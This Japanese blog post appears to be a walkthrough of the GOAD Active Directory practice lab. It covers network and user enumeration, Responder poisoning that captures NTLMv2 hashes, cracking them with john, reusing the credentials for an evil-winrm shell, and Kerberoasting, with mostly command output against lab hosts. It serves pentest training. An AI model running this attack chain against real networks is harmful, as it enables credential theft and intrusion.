---
title: "GOAD Writeup Ch1"
date: "2024-10-13"
draft: "false"
---

## About GOAD
GOADとはActive Directory環境でペンテストの練習ができる環境のことである。

https://github.com/Orange-Cyberdefense/GOAD/

>GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.

と書かれている通り、様々な攻撃手法を試すことができる。

今回は3ドメイン5ホスト環境でペンテストの練習をしてみる。

## Installation
https://github.com/Orange-Cyberdefense/GOAD/?tab=readme-ov-file#installation

公式のREADMEが詳しいのでこれ見てやってください。

## Writeup

### Recon
とりあえず素朴なreconをしてみる。

```
┌──(kali㉿kali)-[~]
└─$ nxc smb 192.168.56.0/24
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

5つのホストに3つのドメインを見つけることができた。

- Domain: essos.local
    - meereen.essos.local (Windows Server 2016 Standard Evaluation 14393 x64)
    - braavos.essos.local (Windows Server 2016 Standard Evaluation 14393 x64)(signing:False)
- Domain: north.sevenkingdoms.local
    - castelblack.north.sevenkingdoms.local (Windows 10 / Server 2019 Build 17763 x64)(signing:False)
    - winterfell.north.sevenkingdoms.local (Windows 10 / Server 2019 Build 17763 x64)
- Domain: sevenkingdoms.local
    - kingslanding.sevenkingdoms.local (Windows 10 / Server 2019 Build 17763 x64)

### Find DC

nslookupでDCを探す

```
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```

```
┌──(kali㉿kali)-[~]
└─$ nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
Server:         192.168.56.10
Address:        192.168.56.10#53

_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.

                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nslookup -type=srv _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.10
Server:         192.168.56.10
Address:        192.168.56.10#53

Non-authoritative answer:
_ldap._tcp.dc._msdcs.north.sevenkingdoms.local  service = 0 100 389 winterfell.north.sevenkingdoms.local.

Authoritative answers can be found from:
winterfell.north.sevenkingdoms.local    internet address = 192.168.56.11

                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nslookup -type=srv _ldap._tcp.dc._msdcs.essos.local 192.168.56.10
Server:         192.168.56.10
Address:        192.168.56.10#53

Non-authoritative answer:
_ldap._tcp.dc._msdcs.essos.local        service = 0 100 389 meereen.essos.local.

Authoritative answers can be found from:
meereen.essos.local     internet address = 192.168.56.12

```

### Setup /etc/hosts

とりあえず見つかったホストをKaliの `/etc/hosts` に追加していく

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
# GOAD
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

### Enumerate user

NetExecでユーザーを列挙してみる。NetExecはcrackmapexecの後継ツール。とりあえずリンクだけ共有。 https://www.netexec.wiki/

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc smb 192.168.56.11 --users                                    
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         192.168.56.11   445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         192.168.56.11   445    WINTERFELL       arya.stark                    2024-08-11 03:42:04 0       Arya Stark 
SMB         192.168.56.11   445    WINTERFELL       sansa.stark                   2024-08-11 03:42:13 0       Sansa Stark 
SMB         192.168.56.11   445    WINTERFELL       brandon.stark                 2024-08-11 03:42:14 0       Brandon Stark 
SMB         192.168.56.11   445    WINTERFELL       rickon.stark                  2024-08-11 03:42:16 0       Rickon Stark 
SMB         192.168.56.11   445    WINTERFELL       hodor                         2024-08-11 03:42:18 0       Brainless Giant 
SMB         192.168.56.11   445    WINTERFELL       jon.snow                      2024-08-11 03:42:20 0       Jon Snow 
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly                 2024-08-11 03:42:22 0       Samwell Tarly (Password : Heartsbane) 
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont                  2024-08-11 03:42:23 0       Jeor Mormont 
SMB         192.168.56.11   445    WINTERFELL       sql_svc                       2024-08-11 03:42:25 0       sql service
```

ついでにパスワードポリシーとかも見てみる

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc smb 192.168.56.11 --pass-pol
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] Dumping password info for domain: NORTH
SMB         192.168.56.11   445    WINTERFELL       Minimum password length: 5
SMB         192.168.56.11   445    WINTERFELL       Password history length: 24
SMB         192.168.56.11   445    WINTERFELL       Maximum password age: 311 days 2 minutes 
SMB         192.168.56.11   445    WINTERFELL       
SMB         192.168.56.11   445    WINTERFELL       Password Complexity Flags: 000000
SMB         192.168.56.11   445    WINTERFELL           Domain Refuse Password Change: 0
SMB         192.168.56.11   445    WINTERFELL           Domain Password Store Cleartext: 0
SMB         192.168.56.11   445    WINTERFELL           Domain Password Lockout Admins: 0
SMB         192.168.56.11   445    WINTERFELL           Domain Password No Clear Change: 0
SMB         192.168.56.11   445    WINTERFELL           Domain Password No Anon Change: 0
SMB         192.168.56.11   445    WINTERFELL           Domain Password Complex: 0
SMB         192.168.56.11   445    WINTERFELL       
SMB         192.168.56.11   445    WINTERFELL       Minimum password age: 1 day 4 minutes 
SMB         192.168.56.11   445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
SMB         192.168.56.11   445    WINTERFELL       Locked Account Duration: 5 minutes 
SMB         192.168.56.11   445    WINTERFELL       Account Lockout Threshold: 5
SMB         192.168.56.11   445    WINTERFELL       Forced Log off Time: Not Set

```

### 共有のゲストアクセスを一覧表示する

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc smb 192.168.56.10-23 -u 'a' -p '' --shares
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\a: STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\a: 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\a: 
SMB         192.168.56.23   445    BRAAVOS          [*] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
SMB         192.168.56.22   445    CASTELBLACK      [*] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public                          Basic Read share for all domain users
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Capture the hash

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth1    
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth1]
    Responder IP               [192.168.56.104]
    Responder IPv6             [fe80::5af0:79:dd52:80d1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-A7U0IXU07FL]
    Responder Domain Name      [4EHO.LOCAL]
    Responder DCE-RPC Port     [48426]

[+] Listening for events...

[+] Exiting...[B^[[B^[[B^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^C
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth1
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth1]
    Responder IP               [192.168.56.104]
    Responder IPv6             [fe80::5af0:79:dd52:80d1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-YPREFKD6ZBU]
    Responder Domain Name      [NMYV.LOCAL]
    Responder DCE-RPC Port     [48610]

[+] Listening for events...                                                                                                                                                                                                                                                                                                

[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [NBT-NS] Poisoned answer sent to 192.168.56.11 for name BRAVOS (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[SMB] NTLMv2-SSP Client   : fe80::65bb:b7ff:1ad1:140
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:d186ef4b2d5f70e9:0E29C7FA08D6D94EA56390D123A5A422:010100000000000080112FF50418DB01BB1A6B5A05F8820700000000020008004E004D005900560001001E00570049004E002D00590050005200450046004B00440036005A004200550004003400570049004E002D00590050005200450046004B00440036005A00420055002E004E004D00590056002E004C004F00430041004C00030014004E004D00590056002E004C004F00430041004C00050014004E004D00590056002E004C004F00430041004C000700080080112FF50418DB0106000400020000000800300030000000000000000000000000300000D3F993AF85BF02D37F4080F83793BDF0F3949F40E62C037FA00F37442D3B980D0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000                                                                                                                                                                                                                                                 
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] Skipping previously captured hash for NORTH\robb.stark
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] Skipping previously captured hash for NORTH\robb.stark
[*] [NBT-NS] Poisoned answer sent to 192.168.56.11 for name MEREN (service: File Server)
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[SMB] NTLMv2-SSP Client   : fe80::65bb:b7ff:1ad1:140
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:7acc26627de9f50b:8B925C1E0C815B42E9D34D1830847365:010100000000000080112FF50418DB01B120FDB3372E91EC00000000020008004E004D005900560001001E00570049004E002D00590050005200450046004B00440036005A004200550004003400570049004E002D00590050005200450046004B00440036005A00420055002E004E004D00590056002E004C004F00430041004C00030014004E004D00590056002E004C004F00430041004C00050014004E004D00590056002E004C004F00430041004C000700080080112FF50418DB0106000400020000000800300030000000000000000000000000300000D3F993AF85BF02D37F4080F83793BDF0F3949F40E62C037FA00F37442D3B980D0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000                                                                                                                                                                                                                                                   
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] Skipping previously captured hash for NORTH\eddard.stark
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Meren.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Meren
[*] Skipping previously captured hash for NORTH\eddard.stark
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] Skipping previously captured hash for NORTH\robb.stark
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] Skipping previously captured hash for NORTH\robb.stark
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to 192.168.56.11   for name Bravos.local
[*] [MDNS] Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos.local
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to fe80::65bb:b7ff:1ad1:140 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] [LLMNR]  Poisoned answer sent to 192.168.56.11 for name Bravos
[*] Skipping previously captured hash for NORTH\robb.stark
[+] Exiting...
```

NTLMハッシュを手に入れたのでクラックする

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                
Using default input encoding: UTF-8
Loaded 9 password hashes with 9 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sexywolfy        (robb.stark)   
6g 0:00:00:14 DONE (2024-10-06 15:40) 0.4276g/s 1022Kp/s 3622Kc/s 3622KC/s !)(OPPQR..*7¡Vamos!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

というわけで次の認証情報を手に入れた `robb.stark/sexywolfy` 

NetExecでSMBの認証に使えるか試してみる

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc smb 192.168.56.10-23 -u 'robb.stark' -p 'sexywolfy'
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\robb.stark:sexywolfy STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\robb.stark:sexywolfy STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\robb.stark:sexywolfy 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\robb.stark:sexywolfy 
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

winterfellで使えるみたい

winrmでも認証情報使えるか試してみる

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ nxc winrm 192.168.56.10-23 -u 'robb.stark' -p 'sexywolfy'
WINRM       192.168.56.11   5985   WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.10   5985   KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local)
WINRM       192.168.56.12   5985   MEEREEN          [*] Windows 10 / Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local)
WINRM       192.168.56.22   5985   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
WINRM       192.168.56.11   5985   WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:sexywolfy (Pwn3d!)
WINRM       192.168.56.23   5985   BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local)
WINRM       192.168.56.23   5985   BRAAVOS          [-] essos.local\robb.stark:sexywolfy
WINRM       192.168.56.12   5985   MEEREEN          [-] essos.local\robb.stark:sexywolfy
WINRM       192.168.56.22   5985   CASTELBLACK      [-] north.sevenkingdoms.local\robb.stark:sexywolfy
WINRM       192.168.56.10   5985   KINGSLANDING     [-] sevenkingdoms.local\robb.stark:sexywolfy
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

使えそう

なのでevil-winrmでシェルを取りに行く

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ evil-winrm -u robb.stark -p sexywolfy -i winterfell.north.sevenkingdoms.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robb.stark\Documents>
```

### Enumerate User

```
*Evil-WinRM* PS C:\Users\robb.stark\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            arya.stark               brandon.stark
catelyn.stark            eddard.stark             Guest
hodor                    jeor.mormont             jon.snow
krbtgt                   rickon.stark             robb.stark
samwell.tarly            sansa.stark              sql_svc
vagrant
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\robb.stark\Documents> 
```

列挙したユーザーをまとめたusers.txtを作成する

```
                                                                                                                                                           
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ cat users.txt            
Administrator
arya.stark
brandon.stark
cetelyn.stark
eddard.stark
Guest
hodor
jeor.mormont
jon.snow
krbtgt
rickon.stark
robb.stark
samwell.tarly
sansa.stark
sql_svc
```

### Kerberoasting

Kerberoastingが可能かどうか確認してみる

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-GetUserSPNs -dc-ip winterfell north.sevenkingdoms.local/"robb.stark":"sexywolfy" -request -k
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation    
---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -------------
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2024-08-10 23:42:13.018886  <never>                     unconstrained 
CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2024-08-10 23:42:20.300231  <never>                     constrained   
HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2024-08-10 23:42:20.300231  <never>                     constrained   
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  2024-08-10 23:42:25.706411  2024-10-06 15:29:36.777610                
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                                  2024-08-10 23:42:25.706411  2024-10-06 15:29:36.777610                

[-] CCache file is not found. Skipping...
